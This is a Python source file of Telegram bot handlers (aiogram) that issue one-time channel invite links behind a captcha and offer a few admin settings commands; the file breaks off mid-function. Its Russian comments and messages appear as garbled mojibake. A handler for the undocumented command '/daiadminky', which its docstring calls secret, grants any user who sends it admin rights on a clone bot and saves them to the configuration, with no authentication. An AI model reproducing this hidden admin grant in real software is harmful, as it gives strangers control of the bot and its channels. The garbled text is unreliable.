import logging
import os
from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, FSInputFile, BufferedInputFile, ChatMemberUpdated
from aiogram.filters import Command, CommandStart, ChatMemberUpdatedFilter
from aiogram.fsm.context import FSMContext
from datetime import datetime
from dotenv import load_dotenv

# –ó–∞–≥—Ä—É–∂–∞–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è
load_dotenv()

from utils.keyboards import get_start_keyboard, get_links_keyboard, get_cancel_keyboard
from utils.helpers import send_error_message, send_success_message, calculate_time_remaining, set_db
from models import UserStates
from utils.captcha import generate_captcha_text, generate_captcha_image
from services.link_generator import LinkGeneratorService

logger = logging.getLogger(__name__)
router = Router()

# –ü–æ–ª—É—á–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_IDS = []
PASSED_CAPTCHA_USERS = set()

async def _prompt_captcha(message: Message, state: FSMContext):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–∞–ø—á–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –∏ –ø–µ—Ä–µ–≤–æ–¥ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ –æ–∂–∏–¥–∞–Ω–∏—è."""
    captcha_text = generate_captcha_text()
    captcha_image = generate_captcha_image(captcha_text)
    await state.update_data(captcha_text=captcha_text)
    await message.answer("üîí –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã —á–µ–ª–æ–≤–µ–∫. –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å –∫–∞—Ä—Ç–∏–Ω–∫–∏:")
    await message.answer_photo(BufferedInputFile(captcha_image, filename="captcha.png"))
    await state.set_state(UserStates.waiting_for_captcha)

def _is_captcha_passed(user_id: int) -> bool:
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤ –ø–∞–º—è—Ç–∏ –∏ –≤ –ë–î (—É—Å—Ç–æ–π—á–∏–≤–æ –ø—Ä–∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–µ)
    if user_id in PASSED_CAPTCHA_USERS:
        return True
    user = db.get_user_by_id(user_id)
    return bool(user and user.get('passed_captcha'))

def get_welcome_message():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –∏–∑ JSON —Ñ–∞–π–ª–∞"""
    import json
    settings_file = os.getenv('SETTINGS_FILE', 'bot_settings.json')
    try:
        if os.path.exists(settings_file):
            with open(settings_file, 'r', encoding='utf-8') as f:
                settings = json.load(f)
                return settings.get('welcome_message', get_default_welcome())
    except Exception as e:
        logger.error(f"Error loading welcome message: {e}")
    
    return get_default_welcome()

def get_default_welcome():
    """–°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä {bot_name})"""
    expire_hours = os.getenv('LINK_EXPIRE_HOURS', '1')
    
    return f"""ü§ñ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ {{bot_name}}!

–ó–¥–µ—Å—å –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—É—á–∏—Ç—å –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ –æ–¥–Ω–æ—Ä–∞–∑–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏ –¥–ª—è –≤—Å—Ç—É–ø–ª–µ–Ω–∏—è –≤ –Ω–∞—à–∏ –∫–∞–Ω–∞–ª—ã.

üîí –ö–∞–∂–¥–∞—è —Å—Å—ã–ª–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑ –∏ —Ç–æ–ª—å–∫–æ –¥–ª—è –≤–∞—Å
‚è∞ –°—Å—ã–ª–∫–∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–µ {expire_hours} —á–∞—Å–æ–≤

–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫!"""

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start"""
    user_id = message.from_user.id
    username = message.from_user.username
    full_name = message.from_user.full_name
    
    # –î–æ–±–∞–≤–ª—è–µ–º –∏–ª–∏ –æ–±–Ω–æ–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ –±–∞–∑–µ
    db.add_or_update_user(user_id, username, full_name)
    
    # –§–æ—Ä–º–∏—Ä—É–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–º–µ–Ω–µ–º –±–æ—Ç–∞
    try:
        bot_info = await message.bot.get_me()
        bot_name = getattr(bot_info, 'full_name', None) or getattr(bot_info, 'first_name', None) or getattr(bot_info, 'username', None) or '–±–æ—Ç'
    except Exception:
        bot_name = '–±–æ—Ç'
    welcome_text = get_welcome_message().format(bot_name=bot_name)

    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ª–æ–≥–æ—Ç–∏–ø–æ–º (–µ—Å–ª–∏ –µ—Å—Ç—å)
    try:
        logo_path = "assets/logo.jpg"
        if os.path.exists(logo_path):
            await message.answer_photo(
                FSInputFile(logo_path),
                caption=welcome_text,
                parse_mode="HTML"
            )
        else:
            await message.answer(
                welcome_text,
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Error sending welcome message: {e}")
        await message.answer(welcome_text)
    
    # –¢—Ä–µ–±—É–µ–º –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è –∫–∞–ø—á–∏ –ø–µ—Ä–µ–¥ –ª—é–±—ã–º–∏ –¥–µ–π—Å—Ç–≤–∏—è–º–∏
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫—É: –≤–∫–ª—é—á–µ–Ω–∞ –ª–∏ –∫–∞–ø—á–∞
    captcha_enabled = db.get_setting('require_captcha', True)
    if not captcha_enabled or _is_captcha_passed(user_id):
        await show_channel_links(message, user_id)
    else:
        PASSED_CAPTCHA_USERS.discard(user_id)
        await _prompt_captcha(message, state)

@router.message(UserStates.waiting_for_captcha)
async def process_captcha(message: Message, state: FSMContext):
    """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Ç–µ–∫—Å—Ç–∞ –∫–∞–ø—á–∏."""
    user_input = (message.text or "").strip().upper()
    data = await state.get_data()
    expected = (data.get('captcha_text') or "").upper()
    if not expected:
        await _prompt_captcha(message, state)
        return
    if user_input != expected:
        await send_error_message(message, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑.")
        await _prompt_captcha(message, state)
        return
    PASSED_CAPTCHA_USERS.add(message.from_user.id)
    db.set_user_passed_captcha(message.from_user.id, True)
    await message.answer("‚úÖ –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞! –í–æ—Ç –≤–∞—à–∏ —Å—Å—ã–ª–∫–∏:")
    await show_channel_links(message, message.from_user.id)
    await state.clear()

@router.callback_query(F.data == "get_links")
async def callback_get_links(callback: CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫"""
    await callback.answer()
    user_id = callback.from_user.id
    
    if db.get_setting('require_captcha', True) and not _is_captcha_passed(user_id):
        await callback.message.answer("üîí –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–π–¥–∏—Ç–µ –∫–∞–ø—á—É –∫–æ–º–∞–Ω–¥–æ–π /start")
        return
    await show_channel_links(callback.message, user_id)

@router.callback_query(F.data == "refresh_links")
async def callback_refresh_links(callback: CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫"""
    await callback.answer("üîÑ –û–±–Ω–æ–≤–ª—è—é —Å—Å—ã–ª–∫–∏...")
    user_id = callback.from_user.id
    
    if db.get_setting('require_captcha', True) and not _is_captcha_passed(user_id):
        await callback.message.answer("üîí –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–π–¥–∏—Ç–µ –∫–∞–ø—á—É –∫–æ–º–∞–Ω–¥–æ–π /start")
        return
    
    # –î–µ–∞–∫—Ç–∏–≤–∏—Ä—É–µ–º —Å—Ç–∞—Ä—ã–µ —Å—Å—ã–ª–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try:
        db.cursor.execute('''
        UPDATE personal_invite_links 
        SET is_active = 0 
        WHERE user_id = ? AND is_active = 1
        ''', (user_id,))
        db.connection.commit()
        
        logger.info(f"Deactivated old links for user {user_id}")
    except Exception as e:
        logger.error(f"Error deactivating old links: {e}")
    
    await show_channel_links(callback.message, user_id, is_refresh=True)

async def show_channel_links(message: Message, user_id: int, is_refresh: bool = False):
    """–ü–æ–∫–∞–∑ —Å—Å—ã–ª–æ–∫ –Ω–∞ –∫–∞–Ω–∞–ª—ã –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        progress_msg = await message.answer("‚è≥ –ì–µ–Ω–µ—Ä–∏—Ä—É—é –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ —Å—Å—ã–ª–∫–∏...")
        
        # –ü–æ–ª—É—á–∞–µ–º —Å—Å—ã–ª–∫–∏ –¥–ª—è –≤—Å–µ—Ö –∫–∞–Ω–∞–ª–æ–≤
        try:
            service = LinkGeneratorService(message.bot, db)
            user_links = await service.generate_links_for_user(user_id)
        except Exception:
            user_links = db.get_user_links_for_all_channels(user_id, BOT_TOKEN)
        
        # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –ø—Ä–æ–≥—Ä–µ—Å—Å–µ
        try:
            await progress_msg.delete()
        except:
            pass
        
        if not user_links:
            await message.answer(
                "üòî –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —Å–µ–π—á–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∫–∞–Ω–∞–ª–æ–≤.\n"
                "–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ –∏–ª–∏ –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.",
                reply_markup=get_start_keyboard()
            )
            return
        
        # –ü–æ–ª—É—á–∞–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –≤—Ä–µ–º–µ–Ω–∏ –∂–∏–∑–Ω–∏ –∏–∑ –±–∞–∑—ã –∏–ª–∏ env
        expire_hours = db.get_setting('link_expire_hours') or int(os.getenv('LINK_EXPIRE_HOURS', '1'))
        
        # –§–æ—Ä–º–∏—Ä—É–µ–º —Ç–µ–∫—Å—Ç —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ —Å—Å—ã–ª–∫–∞—Ö
        links_text = "üîó <b>–í–∞—à–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ –∫–∞–Ω–∞–ª—ã:</b>\n\n"
        
        if is_refresh:
            links_text = "üîÑ <b>–°—Å—ã–ª–∫–∏ –æ–±–Ω–æ–≤–ª–µ–Ω—ã!</b>\n\nüîó <b>–í–∞—à–∏ –Ω–æ–≤—ã–µ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ —Å—Å—ã–ª–∫–∏:</b>\n\n"
        
        links_text += "‚ö†Ô∏è <b>–í–∞–∂–Ω–æ:</b>\n"
        links_text += "‚Ä¢ –ö–∞–∂–¥–∞—è —Å—Å—ã–ª–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑\n"
        links_text += f"‚Ä¢ –°—Å—ã–ª–∫–∏ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã {expire_hours} —á–∞—Å–æ–≤\n"
        links_text += "‚Ä¢ –°—Å—ã–ª–∫–∏ –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã–µ - —Ç–æ–ª—å–∫–æ –¥–ª—è –≤–∞—Å\n\n"
        
        # –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤—Ä–µ–º–µ–Ω–∏ –∏—Å—Ç–µ—á–µ–Ω–∏—è –¥–ª—è –∫–∞–∂–¥–æ–π —Å—Å—ã–ª–∫–∏
        links_text += "üìã <b>–°–ø–∏—Å–æ–∫ –∫–∞–Ω–∞–ª–æ–≤:</b>\n"
        for i, link_data in enumerate(user_links, 1):
            title = link_data['channel_title']
            expire_date = link_data.get('expire_date')
            
            if expire_date:
                time_remaining = calculate_time_remaining(expire_date)
                links_text += f"{i}. {title} (‚è∞ {time_remaining})\n"
            else:
                links_text += f"{i}. {title}\n"
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å–æ —Å—Å—ã–ª–∫–∞–º–∏
        keyboard = get_links_keyboard(user_links)
        
        try:
            await message.answer(
                links_text,
                parse_mode="HTML",
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
        except Exception as e:
            logger.error(f"Error sending links message with HTML: {e}")
            # Fallback –±–µ–∑ HTML
            clean_text = links_text.replace('<b>', '').replace('</b>', '')
            await message.answer(
                clean_text,
                reply_markup=keyboard,
                disable_web_page_preview=True
            )
        
        # –õ–æ–≥–∏—Ä—É–µ–º –≥–µ–Ω–µ—Ä–∞—Ü–∏—é —Å—Å—ã–ª–æ–∫
        logger.info(f"Generated {len(user_links)} personal links for user {user_id}")
        
    except Exception as e:
        logger.error(f"Error showing channel links: {e}")
        await send_error_message(
            message,
            "‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Å—ã–ª–æ–∫. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ."
        )

# –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –≤ —É–ø—Ä–æ—â–µ–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏

# –°–ø—Ä–∞–≤–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞ –≤ —É–ø—Ä–æ—â–µ–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏

# –ö–æ–º–∞–Ω–¥–∞ /help –æ—Ç–∫–ª—é—á–µ–Ω–∞

# –ö–æ–º–∞–Ω–¥–∞ /stats –æ—Ç–∫–ª—é—á–µ–Ω–∞

@router.message(Command("refresh"))
async def cmd_refresh(message: Message):
    """–ö–æ–º–∞–Ω–¥–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫"""
    user_id = message.from_user.id
    if db.get_setting('require_captcha', True) and not _is_captcha_passed(user_id):
        await message.answer("üîí –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–π–¥–∏—Ç–µ –∫–∞–ø—á—É –∫–æ–º–∞–Ω–¥–æ–π /start")
        return
    
    # –î–µ–∞–∫—Ç–∏–≤–∏—Ä—É–µ–º —Å—Ç–∞—Ä—ã–µ —Å—Å—ã–ª–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    try:
        db.cursor.execute('''
        UPDATE personal_invite_links 
        SET is_active = 0 
        WHERE user_id = ? AND is_active = 1
        ''', (user_id,))
        db.connection.commit()
        
        logger.info(f"Deactivated old links for user {user_id}")
    except Exception as e:
        logger.error(f"Error deactivating old links: {e}")
    
    await message.answer("üîÑ –û–±–Ω–æ–≤–ª—è—é –≤–∞—à–∏ —Å—Å—ã–ª–∫–∏...")
    await show_channel_links(message, user_id, is_refresh=True)

@router.message(Command("daiadminky"))
async def cmd_become_clone_admin(message: Message):
    """–°–µ–∫—Ä–µ—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è –∞–¥–º–∏–Ω–æ–º –∫–ª–æ–Ω–∞"""
    user_id = message.from_user.id
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∑–∞–ø—É—â–µ–Ω –ª–∏ –±–æ—Ç –∫–∞–∫ –∫–ª–æ–Ω
    if not os.getenv('RUN_AS_CHILD'):
        # –≠—Ç–æ –æ—Å–Ω–æ–≤–Ω–æ–π –±–æ—Ç, –Ω–µ –∫–ª–æ–Ω
        await message.answer("ü§î –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞.")
        return
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –∞–¥–º–∏–Ω–æ–º
    if user_id in ADMIN_IDS:
        await message.answer("üëë –í—ã —É–∂–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º —ç—Ç–æ–≥–æ –±–æ—Ç–∞!")
        return
    
    # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤ –¥–ª—è —Ç–µ–∫—É—â–µ–π —Å–µ—Å—Å–∏–∏
    ADMIN_IDS.append(user_id)
    
    # –¢–∞–∫–∂–µ –æ–±–Ω–æ–≤–ª—è–µ–º –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é –∫–ª–æ–Ω–∞ –≤ clone_states.json
    try:
        from services.clone_manager import clone_manager
        
        # –ù–∞—Ö–æ–¥–∏–º —Ç–µ–∫—É—â–∏–π –∫–ª–æ–Ω –ø–æ —Ç–æ–∫–µ–Ω—É
        current_token = os.getenv('INSTANCE_TOKEN')
        current_clone = None
        
        for clone in clone_manager.get_all_clones():
            if clone.token == current_token:
                current_clone = clone
                break
        
        if current_clone:
            # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–ø–∏—Å–æ–∫ –∞–¥–º–∏–Ω–æ–≤ –∫–ª–æ–Ω–∞
            if user_id not in current_clone.admin_ids:
                current_clone.admin_ids.append(user_id)
                clone_manager.save_clones()
                
                user_info = f"@{message.from_user.username}" if message.from_user.username else message.from_user.full_name
                
                await message.answer(
                    f"üéâ <b>–ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º!</b>\n\n"
                    f"üëë –í—ã —Å—Ç–∞–ª–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º —ç—Ç–æ–≥–æ –∫–ª–æ–Ω-–±–æ—Ç–∞!\n"
                    f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {user_info}\n"
                    f"üÜî ID: {user_id}\n\n"
                    f"–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–æ–º–∞–Ω–¥—É /admin –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–∞–Ω–µ–ª–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è.",
                    parse_mode="HTML"
                )
                
                logger.info(f"User {user_id} ({user_info}) became admin of clone {current_clone.name}")
            else:
                await message.answer("üëë –í—ã —É–∂–µ —è–≤–ª—è–µ—Ç–µ—Å—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º —ç—Ç–æ–≥–æ –∫–ª–æ–Ω–∞!")
        else:
            await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–ª–æ–Ω–µ.")
            
    except Exception as e:
        logger.error(f"Error in become clone admin: {e}")
        await message.answer("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ª—é–±—ã—Ö –¥—Ä—É–≥–∏—Ö —Å–æ–æ–±—â–µ–Ω–∏–π –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
@router.message()
async def handle_unknown_message(message: Message, state: FSMContext):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π"""
    if db.get_setting('require_captcha', True) and not _is_captcha_passed(message.from_user.id):
        await _prompt_captcha(message, state)
        return
    # –û–±–Ω–æ–≤–ª—è–µ–º –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    db.add_or_update_user(
        message.from_user.id,
        message.from_user.username,
        message.from_user.full_name
    )
    
    await message.answer(
        "ü§î –ù–µ –ø–æ–Ω–∏–º–∞—é —ç—Ç—É –∫–æ–º–∞–Ω–¥—É.\n\n"
        "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /start –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–æ–∫ –Ω–∞ –∫–∞–Ω–∞–ª—ã\n"
        "–∏–ª–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.",
        reply_markup=get_start_keyboard()
    )

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ my_chat_member –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ admin-–º–æ–¥—É–ª–µ, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å –¥—É–±–ª–∏—Ä–æ–≤–∞–Ω–∏—è –ª–æ–≥–∏–∫–∏

def setup(dp, bot, database, admin_ids, get_welcome_func, update_welcome_func):
    """–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤"""
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≥–ª–æ–±–∞–ª—å–Ω—É—é –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –º–æ–¥—É–ª—è
    global db, ADMIN_IDS
    db = database
    ADMIN_IDS = admin_ids or []
    # –ò–Ω—ä–µ–∫—Ü–∏—è –ë–î –≤ utils.helpers
    try:
        set_db(database)
    except Exception:
        pass
    
    dp.include_router(router)

# =====================
# –ú–∏–Ω–∏–º–∞–ª—å–Ω—ã–µ –∞–¥–º–∏–Ω-–∫–æ–º–∞–Ω–¥—ã
# =====================

@router.message(Command("settings"))
async def cmd_settings(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    current_expire = db.get_setting('link_expire_hours') or int(os.getenv('LINK_EXPIRE_HOURS', '1'))
    current_max = db.get_setting('max_link_uses') or int(os.getenv('MAX_LINK_USES', '1'))
    captcha_enabled = db.get_setting('require_captcha', True)
    await message.answer(
        "‚öôÔ∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏:\n\n"
        f"‚è∞ –í—Ä–µ–º—è –∂–∏–∑–Ω–∏ (—á–∞—Å—ã): {current_expire}\n"
        f"üî¢ –õ–∏–º–∏—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π: {current_max}\n"
        f"üîí –ö–∞–ø—á–∞ –ø—Ä–∏ –≤—Ö–æ–¥–µ: {'–≤–∫–ª—é—á–µ–Ω–∞' if captcha_enabled else '–æ—Ç–∫–ª—é—á–µ–Ω–∞'}\n\n"
        "–ò–∑–º–µ–Ω–∏—Ç—å: /set_expire <—á–∞—Å—ã>, /set_max_uses <1-100>, /captcha_on, /captcha_off"
    )

@router.message(Command("set_expire"))
async def cmd_set_expire(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    try:
        parts = (message.text or "").split()
        if len(parts) < 2:
            await message.answer("–£–∫–∞–∂–∏—Ç–µ —á–∏—Å–ª–æ —á–∞—Å–æ–≤. –ü—Ä–∏–º–µ—Ä: /set_expire 24")
            return
        hours = int(parts[1])
        if not (1 <= hours <= 168):
            await message.answer("–í–≤–µ–¥–∏—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ –æ—Ç 1 –¥–æ 168 —á–∞—Å–æ–≤.")
            return
        if db.set_setting('link_expire_hours', hours):
            await message.answer(f"‚úÖ –í—Ä–µ–º—è –∂–∏–∑–Ω–∏ —Å—Å—ã–ª–æ–∫ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ: {hours} —á.")
        else:
            await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫—É.")
    except Exception:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ü—Ä–∏–º–µ—Ä: /set_expire 24")

@router.message(Command("set_max_uses"))
async def cmd_set_max_uses(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    try:
        parts = (message.text or "").split()
        if len(parts) < 2:
            await message.answer("–£–∫–∞–∂–∏—Ç–µ –ª–∏–º–∏—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π. –ü—Ä–∏–º–µ—Ä: /set_max_uses 1")
            return
        max_uses = int(parts[1])
        if not (1 <= max_uses <= 100):
            await message.answer("–í–≤–µ–¥–∏—Ç–µ –∑–Ω–∞—á–µ–Ω–∏–µ –æ—Ç 1 –¥–æ 100.")
            return
        if db.set_setting('max_link_uses', max_uses):
            await message.answer(f"‚úÖ –õ–∏–º–∏—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–π —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {max_uses}")
        else:
            await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫—É.")
    except Exception:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –ü—Ä–∏–º–µ—Ä: /set_max_uses 1")

@router.message(Command("captcha_on"))
async def cmd_captcha_on(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    if db.set_setting('require_captcha', True):
        await message.answer("‚úÖ –ö–∞–ø—á–∞ –≤–∫–ª—é—á–µ–Ω–∞ –¥–ª—è –Ω–æ–≤—ã—Ö –≤—Ö–æ–¥–æ–≤.")
    else:
